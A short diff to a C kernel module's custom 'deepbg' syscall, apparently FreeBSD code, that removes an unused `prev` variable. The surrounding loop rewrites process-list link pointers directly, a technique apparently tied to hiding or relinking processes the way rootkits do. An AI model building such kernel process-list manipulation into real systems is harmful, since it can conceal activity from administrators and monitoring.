@@ -32,7 +32,7 @@ static int deepbg(struct thread *td, void *syscall_args)
 {
    struct deepbg_args *uap;
    uap = (struct deepbg_args *)syscall_args;
-   struct proc *p, *prev = NULL;
+   struct proc *p = NULL;
    struct proc **oldprev = NULL;
    bool target_found;
 
@@ -102,11 +102,8 @@ static int deepbg(struct thread *td, void *syscall_args)
 
             p->p_list.le_prev = oldprev;
             *p->p_list.le_prev = &(*p);
-            prev = NULL;
             break;
          }
-
-         prev = p;
       }
    } while (target_found);
 
